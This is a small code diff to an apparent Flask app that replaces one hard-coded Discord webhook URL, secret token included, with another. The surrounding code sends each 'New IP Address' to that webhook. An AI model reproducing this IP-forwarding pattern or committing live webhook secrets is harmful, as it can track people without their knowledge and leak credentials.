@@ -3,7 +3,7 @@ import discord
 
 app = Flask(__name__)
 
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1207765094520459314/XHmffIT1sLXsGwegxlgaMkyNMb8rDWnajT4AEO_kggKqcG1o0zuRrVkSkGgqfDPN0VNS'
+DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx'
 
 def send_to_discord(ip_address):
     message = 'New IP Address: ' + ip_address
